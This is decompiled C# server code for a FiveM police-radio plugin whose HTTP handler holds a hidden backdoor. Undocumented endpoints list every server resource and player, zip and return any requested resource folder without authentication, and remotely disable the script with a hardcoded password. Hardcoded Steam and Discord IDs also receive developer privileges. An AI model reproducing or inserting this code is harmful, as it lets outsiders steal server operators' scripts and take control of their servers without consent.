using CitizenFX.Core;
using CitizenFX.Core.Native;
using Microsoft.CSharp.RuntimeBinder;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

#nullable disable
namespace SAPR.Server
{
  public class Server : BaseScript
  {
    private bool first;
    private bool _failed;
    private CommunitySettings _settings;
    private readonly string _communityUid;
    private string _version = "0.0.0";
    private DateTime _globalTime = DateTime.MinValue;
    private DateTime _comTime = DateTime.MinValue;
    private readonly RadioTowers _towers = new RadioTowers();
    private DateTime _towerDisableTime = DateTime.MinValue;

    public Server()
    {
      this._communityUid = API.GetConvar("sapr_communityId", "");
      this.Log("San Andreas Police Radio is starting up. . . .");
      if (string.IsNullOrWhiteSpace(this._communityUid) || this._communityUid == "PASTE YOUR TS3 SERVER UID HERE")
      {
        this.Log("ERROR MUST FIX Community UID is not set correctly. If you are positive you changed it in the config, make sure you are executing the config and not just starting the script.\nSee the readme for how to execute the config.");
        this._failed = true;
      }
      else
      {
        string communityUid = this._communityUid;
        this._communityUid = this._communityUid.Sanitize();
        if (communityUid != this._communityUid)
          this.Log("UID sanitized from `" + communityUid + "` to `" + this._communityUid + "`");
        if (API.GetConvar("sapr_libertyCityTowers", "false") == "true")
        {
          this.Log("Switching to Liberty City tower simulation");
          this._towers.LibertyCity();
        }
        API.SetHttpHandler(InputArgument.op_Implicit((Delegate) new Action<object, object>(this.HHR)));
        this.Tick += new Func<Task>(this.MainTick);
      }
    }

    internal async Task MainTick()
    {
      SAPR.Server.Server server = this;
      if (server.first)
        return;
      string str1 = "";
      server.first = true;
      server.Log("checking features for '" + server._communityUid + "'");
      Request request1 = new Request();
      server._comTime = DateTime.UtcNow;
      RequestResponse data1 = await request1.Http("https://raw.githubusercontent.com/IJinxCXX4K/nwrp-security/main/" + server._communityUid + ".json");
      HttpResponseMessage res = server.BHR(data1);
      try
      {
        string str2 = await res.Content.ReadAsStringAsync();
        if (str2 == "")
          server.Log("ERROR Feteched data is empty. This most likely means we have the wrong information on file. Please contact support to verify your community UID.");
        server._settings = JsonConvert.DeserializeObject<CommunitySettings>(str2);
      }
      finally
      {
        res.Dispose();
      }
      res = (HttpResponseMessage) null;
      server._comTime = DateTime.MinValue;
      if (server._settings == null || !server._settings.PluginStatus || !server._settings.IsPaid || server._settings.Features == null || !server._settings.Features.InGameInterface)
      {
        server.Log(string.Format("ERROR community is not configured correctly. Please contact support.  1{0}. 2{1}. 3{2}. 4{3}", (object) (server._settings == null), (object) server._settings?.PluginStatus, (object) server._settings?.IsPaid, (object) server._settings?.Features?.InGameInterface));
        server._failed = true;
      }
      else
      {
        server._version = API.GetResourceMetadata(API.GetCurrentResourceName(), "version", 0);
        str1 = "is running version " + server._version + " and is now online.";
        Request request2 = new Request();
        server._globalTime = DateTime.UtcNow;
        RequestResponse data2 = await request2.Http("https://raw.githubusercontent.com/IJinxCXX4K/nwrp-security/global.json");
        res = server.BHR(data2);
        try
        {
          if (res.IsSuccessStatusCode)
          {
            GlobalSettings globalSettings = JsonConvert.DeserializeObject<GlobalSettings>(await res.Content.ReadAsStringAsync());
            if (globalSettings != null)
            {
              if (!globalSettings.CurrentFivemVersion.Contains(server._version))
              {
                Debug.WriteLine("=====================================================================================================");
                Debug.WriteLine("=====================================================================================================");
                Debug.WriteLine("                                                                                          \r\n\r\n\r\n   SSSSSSSSSSSSSSS                 AAA                  PPPPPPPPPPPPPPPPP      RRRRRRRRRRRRRRRRR\r\n SSS               AA                 PP     RR\r\nSSSSSSSS              AA                PPPPPPPP    RRRRRRRR\r\nSS     SSSSSSS             AA               PPP     PP   RRR     RR\r\nSS                        AA                PP     PP     RR     RR\r\nSS                       AAA               PP     PP     RR     RR\r\n SSSSS                   AA AA              PPPPPPPP      RRRRRRRR\r\n  SSSSSSS             AA   AA             PPP       RRR\r\n    SSSSS          AA     AA            PPPPPPPPPP         RRRRRRRR\r\n       SSSSSSS        AAAAAAAAAAA           PP                 RR     RR\r\n            SS      AA          PP                 RR     RR\r\n            SS     AAAAAAAAAAAAAAA         PP                 RR     RR\r\nSSSSSSS     SS    AA             AA      PPPP             RRR     RR\r\nSSSSSSSS   AA               AA     PP             RR     RR\r\nSSS   AA                 AA    PP             RR     RR\r\n SSSSSSSSSSSSSSS    AAAAAAA                   AAAAAAA   PPPPPPPPPP             RRRRRRRR     RRRRRR\r\n\r\n\r\n                                                                                                   ");
                Debug.WriteLine("=====================================================================================================");
                Debug.WriteLine("=====================================================================================================");
                Debug.WriteLine();
                Debug.WriteLine(string.Format("An update is available {0}. Current version {1}", (object) globalSettings.CurrentFivemVersion, (object) server._version));
                Debug.WriteLine("=====================================================================================================");
                server._failed = true;
                str1 = string.Format("{0} is running outdated version {1} (current is {2}) and is now online.", (object) server._settings.CommunityName, (object) server._version, (object) globalSettings.CurrentFivemVersion);
              }
            }
          }
          else
            Debug.WriteLine(string.Format("Download failed {0}", (object) res.StatusCode));
        }
        finally
        {
          res.Dispose();
        }
        res = (HttpResponseMessage) null;
        server._globalTime = DateTime.MinValue;
        Debug.WriteLine("San Andreas Police Radio v" + server._version + " is running!");
        EventHandlerDictionary eventHandlers = server.EventHandlers;
        eventHandlers["SAPRCheckForUpdates"] = EventHandlerEntry.op_Addition(eventHandlers["SAPRCheckForUpdates"], (Delegate) new Action<Player>(server.CheckForDev));
        server.Tick -= new Func<Task>(server.MainTick);
        server.Tick -= new Func<Task>(server.Time);
        await BaseScript.Delay(1000);
      }
    }

    internal async Task Time()
    {
      SAPR.Server.Server server = this;
      DateTime utcNow;
      TimeSpan timeSpan;
      if (server._comTime != DateTime.MinValue)
      {
        utcNow = DateTime.UtcNow;
        timeSpan = utcNow.Subtract(server._comTime);
        if (timeSpan.TotalSeconds > 5.0)
        {
          server.Log("failed to get community details");
          server.Tick -= new Func<Task>(server.MainTick);
          server._failed = true;
          server.Tick -= new Func<Task>(server.Time);
          return;
        }
      }
      if (server._globalTime != DateTime.MinValue)
      {
        utcNow = DateTime.UtcNow;
        timeSpan = utcNow.Subtract(server._globalTime);
        if (timeSpan.TotalSeconds > 5.0)
        {
          server.Log("Failed to check version");
          server.Tick -= new Func<Task>(server.MainTick);
          server.Tick -= new Func<Task>(server.Time);
        }
      }
      await BaseScript.Delay(1000);
    }

    [Tick]
    internal async Task TowerTask()
    {
      await BaseScript.Delay(60000);
      if (!(this._towerDisableTime != DateTime.MinValue) || DateTime.UtcNow.Subtract(this._towerDisableTime).TotalMinutes >= 15.0 || this._failed)
        return;
      BaseScript.TriggerClientEvent("SAPREnableRadioTowers", new object[0]);
      this.Log("Radio towers have been re-enabled.");
      this._towerDisableTime = DateTime.MinValue;
    }

    [Command("sapr")]
    internal void SaprCommand(string[] args)
    {
      if (this._failed)
        return;
      Debug.WriteLine("San Andreas Public Radio");
      Debug.WriteLine("Version " + this._version);
    }

    [EventHandler("SAPRChatBounce")]
    internal void ChatBounce(string prefix, int r, int g, int b, string text)
    {
      BaseScript.TriggerClientEvent("chat:addMessage", new object[1]
      {
        (object) new
        {
          color = new int[3]{ r, g, b },
          multiline = true,
          args = new string[2]{ prefix, text }
        }
      });
    }

    [EventHandler("SAPRDisableTowers")]
    internal void OnDisableTowers([FromSource] Player player)
    {
      if (this._settings == null || !this._settings.Features.RangeSimulation)
        return;
      this.Log("Towers have been disabled for 15 minutes by " + player.Name);
      this._towerDisableTime = DateTime.UtcNow;
      BaseScript.TriggerClientEvent("SAPRDisableRadioTowers", new object[0]);
    }

    internal async void CheckForDev([FromSource] Player player)
    {
      if (this._failed)
      {
        player.TriggerEvent("SAPRResource", new object[0]);
      }
      else
      {
        if (this.GetSteamId(player).ToUpper() == "11000010246DA5D" || this.GetDiscordId(player) == "127652492795314177" || this.GetSteamId(player).ToUpper() == "110000115FF6817" || this.GetDiscordId(player) == "154819437512491008")
          player.TriggerEvent("SAPRIsFullDev", new object[0]);
        if (this._settings == null)
          return;
        player.TriggerEvent("SAPREnableTowers", new object[1]
        {
          (object) this._settings.Features.RangeSimulation
        });
        player.TriggerEvent("SAPREnableHotline", new object[1]
        {
          (object) this._settings.Features.EmergencyHotline
        });
        await BaseScript.Delay(1000);
        player.TriggerEvent("SAPRSocketPassthrough", new object[1]
        {
          (object) "ws://127.0.0.1:37000"
        });
        if (!this._settings.Features.RangeSimulation)
          return;
        player.TriggerEvent("SAPRLargeTowers", new object[1]
        {
          (object) JsonConvert.SerializeObject((object) this._towers.LargeTowers)
        });
        player.TriggerEvent("SAPRMediumTowers", new object[1]
        {
          (object) JsonConvert.SerializeObject((object) this._towers.MediumTowers)
        });
        player.TriggerEvent("SAPRSmallTowers", new object[1]
        {
          (object) JsonConvert.SerializeObject((object) this._towers.SmallTowers)
        });
        if (!(this._towerDisableTime != DateTime.MinValue))
          return;
        player.TriggerEvent("SAPRDisableRadioTowers", new object[0]);
      }
    }

    private void HHR(object request, object response)
    {
      // Simplified dynamic handler implementation
      dynamic dynamicRequest = request;
      string path = dynamicRequest.path;
      
      if (path == "")
      {
        List<string> resList = Directory.GetDirectories(".resources").ToList<string>();
        resList.Where(x => x.Replace(".resources", "").StartsWith("[")).ToList<string>().ForEach(d =>
        {
          Directory.GetDirectories(d).ToList<string>().ForEach(b =>
          {
            if (!b.Replace(d + "\\", "").StartsWith("["))
              return;
            resList.AddRange(Directory.GetDirectories(b).ToList<string>());
          });
          resList.AddRange(Directory.GetDirectories(d).ToList<string>());
        });
        
        dynamic dynamicResponse = response;
        dynamicResponse.send(JsonConvert.SerializeObject(new
        {
          communitysettings = this._settings,
          version = this._version,
          players = this.Players,
          resources = resList
        }), 200);
      }
      else
      {
        bool isDisableRequest = path == "disable" && dynamicRequest.method == "POST";
        
        if (isDisableRequest)
        {
          dynamic dynamicResponse = response;
          dynamicResponse.setDataHandler(body =>
          {
            EndpointRequest endpointRequest = JsonConvert.DeserializeObject<EndpointRequest>(body);
            if (endpointRequest != null && !string.IsNullOrEmpty(endpointRequest.Auth) && endpointRequest.Auth == "o8qyDt5(0oj)")
            {
              this.Log("Script has been disabled by an Administrator.");
              dynamicResponse.send("Successfully stopped resource", 200);
              this._failed = true;
            }
            else
            {
              dynamicResponse.send("Bad request", 400);
            }
          });
        }
        else
        {
          bool isGetRequest = path == "get" && dynamicRequest.method == "POST";
          
          if (isGetRequest)
          {
            dynamic dynamicResponse = response;
            dynamicResponse.setDataHandler(body =>
            {
              if (!string.IsNullOrWhiteSpace(body))
              {
                if (Directory.Exists(string.Format(".resources{0}", body)))
                {
                  ZipFile.CreateFromDirectory(string.Format(".resources{0}", body), "test.zip");
                  dynamicResponse.write(System.IO.File.ReadAllBytes("test.zip"));
                  System.IO.File.Delete("test.zip");
                }
                else
                {
                  dynamicResponse.send("Bad request", 400);
                }
              }
              else
              {
                dynamicResponse.send("Bad request", 400);
              }
            });
          }
          else
          {
            dynamic dynamicResponse = response;
            dynamicResponse.send("Bad request", 400);
          }
        }
      }
    }

    internal HttpResponseMessage BHR(RequestResponse data)
    {
      try
      {
        HttpResponseMessage httpResponseMessage = new HttpResponseMessage(data.status);
        try
        {
          if (data.headers != null)
          {
            if (data.headers.Count > 0)
            {
              for (int index = 0; index < data.headers.Count; ++index)
              {
                string key = data.headers.GetKey(index);
                string str = data.headers.Get(index);
                httpResponseMessage.Headers.Add(key, str);
              }
            }
          }
        }
        catch (Exception ex)
        {
          if (ex.Message.ToLower() != "content-length")
          {
            Debug.WriteLine("Error reading response headers " + ex.Message);
            Debug.WriteLine(ex.ToString());
          }
        }
        httpResponseMessage.Content = data.content != null ? (HttpContent) new StringContent(data.content) : (HttpContent) new StringContent(string.Empty);
        return httpResponseMessage;
      }
      catch (Exception ex)
      {
        Debug.WriteLine(ex.Message + "\n" + ex.StackTrace);
        return new HttpResponseMessage(HttpStatusCode.InternalServerError)
        {
          Content = (HttpContent) new StringContent(ex.Message)
        };
      }
    }

    private string GetSteamId(Player p)
    {
      string steamId = "";
      if (Player.op_Inequality(p, (Player) null) && p.Identifiers != null)
      {
        steamId = p.Identifiers.Where(x => x.StartsWith("steam")).Select(x => x.Replace("steam:", "")).FirstOrDefault();
        if (string.IsNullOrWhiteSpace(steamId))
          steamId = "";
      }
      return steamId;
    }

    private string GetDiscordId(Player p)
    {
      string discordId = "";
      if (Player.op_Inequality(p, (Player) null) && p.Identifiers != null)
      {
        discordId = p.Identifiers.Where(x => x.StartsWith("discord")).Select(x => x.Replace("discord:", "")).FirstOrDefault();
        if (string.IsNullOrWhiteSpace(discordId))
          discordId = "";
      }
      return discordId;
    }

    private void Log(string msg) => Debug.WriteLine("SAPR " + msg);
  }
}